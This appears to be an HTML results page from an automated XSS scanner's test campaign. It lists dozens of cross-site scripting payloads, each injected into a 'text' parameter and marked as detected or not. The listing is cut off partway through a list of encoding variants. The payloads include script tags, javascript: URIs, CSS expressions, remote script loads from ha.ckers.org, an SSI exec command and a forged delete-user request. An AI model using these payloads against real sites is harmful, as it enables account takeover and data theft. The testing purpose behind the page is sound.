@@ -1,0 +1,1129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8"/>
+	<link rel="icon" type="image/png" href="assets/img/favicon.ico">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+	<title>Test Campaign</title>
+	<meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport' />
+	<meta name="viewport" content="width=device-width" />
+	<link href="assets/css/bootstrap.min.css" rel="stylesheet" />
+	<link href="assets/css/light-bootstrap-dashboard.css" rel="stylesheet"/>
+	<link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
+	<link href='http://fonts.googleapis.com/css?family=Roboto:400,700,300' rel='stylesheet' type='text/css'>
+	<link href="assets/css/pe-icon-7-stroke.css" rel="stylesheet" />
+</head>
+<body>
+<div class="content">
+	<div class="row">
+		<div class="col-md-12">
+			<div class="card">
+				<div class="header">
+					<h4 class="title">Testcase Variantss</h4>
+				</div>
+				<div class="content table-responsive table-full-width">
+					<table class="table table-hover table-striped">
+						<thead>
+							<tr>
+								<th style="width:5%">No</th>
+								<th style="width:60%">Payload</th>
+								<th>Associated observation</th>
+								<th>Vulnerability</th>
+							</tr>
+						<thead>
+						<tbody class="table-striped">
+							<tr data-status="detected">
+								<td>1</td>
+								<td>checking that vector &lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt; has been reflected verbatim...
+injecting payload &#39;;alert(String.fromCharCode(88,83,83))//\&#39;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&#39;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;=&amp;{} in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>2</td>
+								<td>checking that vector &#39;;alert(String.fromCharCode(88,83,83))//\&#39;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&#39;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;=&amp;{} has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>3</td>
+								<td>injecting payload &#39;&#39;;!--&quot;&lt;XSS&gt;=&amp;{()} in parameter text.
+checking that vector &#39;&#39;;!--&quot;&lt;XSS&gt;=&amp;{()} has been reflected verbatim...
+injecting payload &lt;SCRIPT&gt;alert(&#39;XSS&#39;)&lt;/SCRIPT&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>4</td>
+								<td>checking that vector &lt;SCRIPT&gt;alert(&#39;XSS&#39;)&lt;/SCRIPT&gt; has been reflected verbatim...
+injecting payload &lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>5</td>
+								<td>checking that vector &lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt; has been reflected verbatim...
+injecting payload &lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>6</td>
+								<td>checking that vector &lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>7</td>
+								<td>injecting payload &lt;BASE HREF=&quot;javascript:alert(&#39;XSS&#39;);//&quot;&gt; in parameter text.
+checking that vector &lt;BASE HREF=&quot;javascript:alert(&#39;XSS&#39;);//&quot;&gt; has been reflected verbatim...
+injecting payload &lt;BGSOUND SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>8</td>
+								<td>checking that vector &lt;BGSOUND SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt; has been reflected verbatim...
+injecting payload &lt;BODY BACKGROUND=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>9</td>
+								<td>checking that vector &lt;BODY BACKGROUND=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>10</td>
+								<td>injecting payload &lt;BODY ONLOAD=alert(&#39;XSS&#39;)&gt; in parameter text.
+checking that vector &lt;BODY ONLOAD=alert(&#39;XSS&#39;)&gt; has been reflected verbatim...
+injecting payload &lt;DIV STYLE=&quot;background-image: url(javascript:alert(&#39;XSS&#39;))&quot;&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>11</td>
+								<td>checking that vector &lt;DIV STYLE=&quot;background-image: url(javascript:alert(&#39;XSS&#39;))&quot;&gt; has been reflected verbatim...
+injecting payload &lt;DIV STYLE=&quot;background-image: url(javascript:alert(&#39;XSS&#39;))&quot;&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>12</td>
+								<td>checking that vector &lt;DIV STYLE=&quot;background-image: url(javascript:alert(&#39;XSS&#39;))&quot;&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>13</td>
+								<td>injecting payload &lt;DIV STYLE=&quot;width: expression(alert(&#39;XSS&#39;));&quot;&gt; in parameter text.
+checking that vector &lt;DIV STYLE=&quot;width: expression(alert(&#39;XSS&#39;));&quot;&gt; has been reflected verbatim...
+injecting payload &lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;&lt;/FRAMESET&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>14</td>
+								<td>checking that vector &lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;&lt;/FRAMESET&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>15</td>
+								<td>injecting payload &lt;IFRAME SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;&lt;/IFRAME&gt; in parameter text.
+checking that vector &lt;IFRAME SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;&lt;/IFRAME&gt; has been reflected verbatim...
+injecting payload &lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>16</td>
+								<td>checking that vector &lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt; has been reflected verbatim...
+injecting payload &lt;IMG SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>17</td>
+								<td>checking that vector &lt;IMG SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt; has been reflected verbatim...
+injecting payload &lt;IMG SRC=javascript:alert(&#39;XSS&#39;)&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>18</td>
+								<td>checking that vector &lt;IMG SRC=javascript:alert(&#39;XSS&#39;)&gt; has been reflected verbatim...
+injecting payload &lt;IMG DYNSRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>19</td>
+								<td>checking that vector &lt;IMG DYNSRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt; has been reflected verbatim...
+injecting payload &lt;IMG LOWSRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>20</td>
+								<td>checking that vector &lt;IMG LOWSRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>21</td>
+								<td>injecting payload &lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt; in parameter text.
+checking that vector &lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt; has been reflected verbatim...
+injecting payload Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>22</td>
+								<td>checking that vector Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser has been reflected verbatim...
+injecting payload exp/*&lt;XSS STYLE=&#39;no\xss:noxss(&quot;*//*&quot;);
+xss:ex/*XSS*//*/*/pression(alert(&quot;XSS&quot;))&#39;&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>23</td>
+								<td>checking that vector exp/*&lt;XSS STYLE=&#39;no\xss:noxss(&quot;*//*&quot;);
+xss:ex/*XSS*//*/*/pression(alert(&quot;XSS&quot;))&#39;&gt; has been reflected verbatim...
+injecting payload &lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>24</td>
+								<td>checking that vector &lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS has been reflected verbatim...
+injecting payload &lt;IMG SRC=&#39;vbscript:msgbox(&quot;XSS&quot;)&#39;&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="notdetected">
+								<td>25</td>
+								<td>checking that vector &lt;IMG SRC=&#39;vbscript:msgbox(&quot;XSS&quot;)&#39;&gt; has been reflected verbatim...
+injecting payload %BCscript%BEalert(%A2XSS%A2)%BC/script%BE in parameter text.
+</td>
+								<td></td>
+								<td class="notdetected">No detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>26</td>
+								<td>checking that vector %BCscript%BEalert(%A2XSS%A2)%BC/script%BE has been reflected verbatim...
+injecting payload &lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&#39;XSS&#39;);&quot;&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>27</td>
+								<td>checking that vector &lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&#39;XSS&#39;);&quot;&gt; has been reflected verbatim...
+injecting payload &lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>28</td>
+								<td>checking that vector &lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>29</td>
+								<td>injecting payload &lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&#39;XSS&#39;);&quot;&gt; in parameter text.
+checking that vector &lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&#39;XSS&#39;);&quot;&gt; has been reflected verbatim...
+injecting payload &lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>30</td>
+								<td>injecting payload &lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(&#39;XSS&#39;)&gt;&lt;/OBJECT&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>31</td>
+								<td>checking that vector &lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(&#39;XSS&#39;)&gt;&lt;/OBJECT&gt; has been reflected verbatim...
+injecting payload &lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>32</td>
+								<td>checking that vector &lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>33</td>
+								<td>injecting payload a=&quot;get&quot;;
+b=&quot;URL(&quot;&quot;;
+c=&quot;javascript:&quot;;
+d=&quot;alert(&#39;XSS&#39;);&quot;)&quot;;
+eval(a+b+c+d); in parameter text.
+checking that vector a=&quot;get&quot;;
+b=&quot;URL(&quot;&quot;;
+c=&quot;javascript:&quot;;
+d=&quot;alert(&#39;XSS&#39;);&quot;)&quot;;
+eval(a+b+c+d); has been reflected verbatim...
+injecting payload &lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&#39;XSS&#39;))&quot;&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>34</td>
+								<td>checking that vector &lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&#39;XSS&#39;))&quot;&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>35</td>
+								<td>injecting payload &lt;XSS STYLE=&quot;xss:expression(alert(&#39;XSS&#39;))&quot;&gt; in parameter text.
+checking that vector &lt;XSS STYLE=&quot;xss:expression(alert(&#39;XSS&#39;))&quot;&gt; has been reflected verbatim...
+injecting payload &lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>36</td>
+								<td>checking that vector &lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt; has been reflected verbatim...
+injecting payload &lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&#39;XSS&#39;)&quot;)}&lt;/STYLE&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>37</td>
+								<td>checking that vector &lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&#39;XSS&#39;)&quot;)}&lt;/STYLE&gt; has been reflected verbatim...
+injecting payload &lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>38</td>
+								<td>checking that vector &lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt; has been reflected verbatim...
+injecting payload &lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>39</td>
+								<td>checking that vector &lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt; has been reflected verbatim...
+injecting payload &lt;STYLE&gt;@import&#39;http://ha.ckers.org/xss.css&#39;;&lt;/STYLE&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>40</td>
+								<td>checking that vector &lt;STYLE&gt;@import&#39;http://ha.ckers.org/xss.css&#39;;&lt;/STYLE&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>41</td>
+								<td>injecting payload &lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt; in parameter text.
+checking that vector &lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt; has been reflected verbatim...
+injecting payload &lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>42</td>
+								<td>checking that vector &lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>43</td>
+								<td>injecting payload &lt;TABLE BACKGROUND=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;&lt;/TABLE&gt; in parameter text.
+checking that vector &lt;TABLE BACKGROUND=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;&lt;/TABLE&gt; has been reflected verbatim...
+injecting payload &lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>44</td>
+								<td>checking that vector &lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt; has been reflected verbatim...
+injecting payload &lt;HTML xmlns:xss&gt;
+&lt;?import namespace=&quot;xss&quot; implementation=&quot;http://ha.ckers.org/xss.htc&quot;&gt;
+&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;
+&lt;/HTML&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>45</td>
+								<td>checking that vector &lt;HTML xmlns:xss&gt;
+&lt;?import namespace=&quot;xss&quot; implementation=&quot;http://ha.ckers.org/xss.htc&quot;&gt;
+&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;
+&lt;/HTML&gt; has been reflected verbatim...
+injecting payload &lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&#39;XSS&#39;);&quot;&gt;]]&gt;
+&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>46</td>
+								<td>checking that vector &lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&#39;XSS&#39;);&quot;&gt;]]&gt;
+&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt; has been reflected verbatim...
+injecting payload &lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&#39;XSS&#39;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
+&lt;SPAN DATASRC=&quot;#xss&quot; DATAFLD=&quot;B&quot; DATAFORMATAS=&quot;HTML&quot;&gt;&lt;/SPAN&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>47</td>
+								<td>checking that vector &lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&#39;XSS&#39;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
+&lt;SPAN DATASRC=&quot;#xss&quot; DATAFLD=&quot;B&quot; DATAFORMATAS=&quot;HTML&quot;&gt;&lt;/SPAN&gt; has been reflected verbatim...
+injecting payload &lt;XML SRC=&quot;http://ha.ckers.org/xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;
+&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>48</td>
+								<td>checking that vector &lt;XML SRC=&quot;http://ha.ckers.org/xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;
+&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt; has been reflected verbatim...
+injecting payload &lt;HTML&gt;&lt;BODY&gt;
+&lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&gt;
+&lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt;
+&lt;t:set attributeName=&quot;innerHTML&quot; to=&quot;XSS&lt;SCRIPT DEFER&gt;alert(&#39;XSS&#39;)&lt;/SCRIPT&gt;&quot;&gt; &lt;/BODY&gt;&lt;/HTML&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>49</td>
+								<td>checking that vector &lt;HTML&gt;&lt;BODY&gt;
+&lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&gt;
+&lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt;
+&lt;t:set attributeName=&quot;innerHTML&quot; to=&quot;XSS&lt;SCRIPT DEFER&gt;alert(&#39;XSS&#39;)&lt;/SCRIPT&gt;&quot;&gt; &lt;/BODY&gt;&lt;/HTML&gt; has been reflected verbatim...
+injecting payload &lt;!--[if gte IE 4]&gt;
+&lt;SCRIPT&gt;alert(&#39;XSS&#39;);&lt;/SCRIPT&gt;
+&lt;![endif]--&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>50</td>
+								<td>checking that vector &lt;!--[if gte IE 4]&gt;
+&lt;SCRIPT&gt;alert(&#39;XSS&#39;);&lt;/SCRIPT&gt;
+&lt;![endif]--&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>51</td>
+								<td>injecting payload &lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&#39;XSS&#39;)&lt;/SCRIPT&gt;&quot;&gt; in parameter text.
+checking that vector &lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&#39;XSS&#39;)&lt;/SCRIPT&gt;&quot;&gt; has been reflected verbatim...
+injecting payload &lt;XSS STYLE=&quot;behavior: url(http://ha.ckers.org/xss.htc);&quot;&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>52</td>
+								<td>checking that vector &lt;XSS STYLE=&quot;behavior: url(http://ha.ckers.org/xss.htc);&quot;&gt; has been reflected verbatim...
+injecting payload &lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>53</td>
+								<td>checking that vector &lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt; has been reflected verbatim...
+injecting payload &lt;!--#exec cmd=&quot;/bin/echo &#39;&lt;SCRIPT SRC&#39;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &#39;=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&#39;&quot;--&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>54</td>
+								<td>checking that vector &lt;!--#exec cmd=&quot;/bin/echo &#39;&lt;SCRIPT SRC&#39;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &#39;=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&#39;&quot;--&gt; has been reflected verbatim...
+injecting payload &lt;? echo(&#39;&lt;SCR)&#39;;
+echo(&#39;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&#39;); ?&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>55</td>
+								<td>checking that vector &lt;? echo(&#39;&lt;SCR)&#39;;
+echo(&#39;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&#39;); ?&gt; has been reflected verbatim...
+injecting payload &lt;BR SIZE=&quot;&amp;{alert(&#39;XSS&#39;)}&quot;&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>56</td>
+								<td>checking that vector &lt;BR SIZE=&quot;&amp;{alert(&#39;XSS&#39;)}&quot;&gt; has been reflected verbatim...
+injecting payload &lt;
+%3C
+&amp;lt
+&lt;
+&amp;LT
+&amp;LT;
+&amp;#60
+&amp;#060
+&amp;#0060
+&amp;#00060
+&amp;#000060
+&amp;#0000060
+&lt;
+&lt;
+&lt;
+&lt;
+&lt;
+&lt;
+&amp;#x3c
+&amp;#x03c
+&amp;#x003c
+&amp;#x0003c
+&amp;#x00003c
+&amp;#x000003c
+&lt;
+&lt;
+&lt;
+&lt;
+&lt;
+&lt;
+&amp;#X3c
+&amp;#X03c
+&amp;#X003c
+&amp;#X0003c
+&amp;#X00003c
+&amp;#X000003c
+&lt;
+&lt;
+&lt;
+&lt;
+&lt;
+&lt;
+&amp;#x3C
+&amp;#x03C
+&amp;#x003C
+&amp;#x0003C
+&amp;#x00003C
+&amp;#x000003C
+&lt;
+&lt;
+&lt;
+&lt;
+&lt;
+&lt;
+&amp;#X3C
+&amp;#X03C
+&amp;#X003C
+&amp;#X0003C
+&amp;#X00003C
+&amp;#X000003C
+&lt;
+&lt;
+&lt;
+&lt;
+&lt;
+&lt;
+\x3c
+\x3C
+\u003c
+\u003C in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>57</td>
+								<td>checking that vector &lt;
+%3C
+&amp;lt
+&lt;
+&amp;LT
+&amp;LT;
+&amp;#60
+&amp;#060
+&amp;#0060
+&amp;#00060
+&amp;#000060
+&amp;#0000060
+&lt;
+&lt;
+&lt;
+&lt;
+&lt;
+&lt;
+&amp;#x3c
+&amp;#x03c
+&amp;#x003c
+&amp;#x0003c
+&amp;#x00003c
+&amp;#x000003c
+&lt;
+&lt;
+&lt;
+&lt;
+&lt;
+&lt;
+&amp;#X3c
+&amp;#X03c
+&amp;#X003c
+&amp;#X0003c
+&amp;#X00003c
+&amp;#X000003c
+&lt;
+&lt;
+&lt;
+&lt;
+&lt;
+&lt;
+&amp;#x3C
+&amp;#x03C
+&amp;#x003C
+&amp;#x0003C
+&amp;#x00003C
+&amp;#x000003C
+&lt;
+&lt;
+&lt;
+&lt;
+&lt;
+&lt;
+&amp;#X3C
+&amp;#X03C
+&amp;#X003C
+&amp;#X0003C
+&amp;#X00003C
+&amp;#X000003C
+&lt;
+&lt;
